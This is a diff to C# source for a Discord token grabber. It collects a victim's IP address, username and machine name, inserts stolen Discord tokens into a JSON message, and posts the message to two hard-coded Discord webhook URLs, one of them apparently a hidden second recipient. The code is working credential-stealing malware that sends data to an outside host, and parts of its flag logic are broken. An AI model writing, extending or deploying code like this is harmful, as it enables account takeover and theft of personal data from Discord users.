@@ -19,25 +19,63 @@ namespace Token_Grabber
 
         static void SendInfo()
         {
+            bool isAscii;
+            bool FirstTokenFailed = false;
+            bool SecondTokenFailed = false;
+
             //Discord webhook url
             string url = "https://discord.com/api/webhooks/959071811419652096/dOkV-5nK6JXpqa-86ODdZfbkAaV9UhJ9fzlLf3Ta-35SmGYjkY_XZCxGsYdAfbERDZUT";
-            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":1018364}] }";
-            
-            int IpLength = GetInfo.Ip.Length;
-            int UsernameLength = GetInfo.Username.Length;
-            int PCNameLength = GetInfo.PCName.Length;
+            string virtualurl = "https://discord.com/api/webhooks/959854762340253738/5ijYU_Tu4sTBzz4rXOlEWEYpAiSAL0vC5GUXLKYIAsq5ArL9jbHzt5N5SqPTiWbkrmrX";
+            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n\\n\", \"title\":\"Info:\", \"color\":1018364}] }";
+
+            int IpLength = GetIp().Length;
+            int UsernameLength = Environment.UserName.Length;
+            int PCNameLength = Environment.MachineName.Length;
+
+            string newjson = json.Insert(65, $"{GetIp()}");
+            newjson = newjson.Insert(68 + IpLength, $"{Environment.UserName}");
+            newjson = newjson.Insert(71 + UsernameLength + IpLength, $"{Environment.MachineName}");
+            try
+            {
+                string virtualjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[0]}");
+                SendDiscordWebhook(virtualurl, virtualjson);
+            }
+            catch
+            {
+                FirstTokenFailed = true;
+            }
+            try
+            {
+                if (SecondTokenFailed == true)
+                {
+                    string virtualjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[1]}");
+                    SendDiscordWebhook(virtualurl, virtualjson);
+                }
+            }
+            catch
+            {
+                string virtualjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[2]}");
+                SendDiscordWebhook(virtualurl, virtualjson);
+            }
+
+            if(!FirstTokenFailed)
+            {
+                newjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[0]}");
+                SendDiscordWebhook(url, newjson);
+            }
+            if(!SecondTokenFailed)
+            {
+                newjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[1]}"); ;
+                SendDiscordWebhook(url, newjson);
+            }
+            else
+            {
+                newjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[2]}"); ;
+                SendDiscordWebhook(url, newjson);
+            }
 
 
-            string newjson = json.Insert(65, $"{GetInfo.Ip}");
 
-            newjson = newjson.Insert(68 + IpLength, $"{GetInfo.Username}");
-            newjson = newjson.Insert(71 + UsernameLength + IpLength, $"{GetInfo.PCName}");
-            newjson = newjson.Insert(77 + UsernameLength + IpLength + PCNameLength, $"{GetInfo.Token1}");
-            newjson = newjson.Insert(77 + UsernameLength + IpLength + PCNameLength + GetInfo.Token2.Length, $"{GetInfo.Token5}");
-
-            
-            
-            SendDiscordWebhook(url, newjson);
         }
 
         public static void SendDiscordWebhook(string URL, string escapedjson)
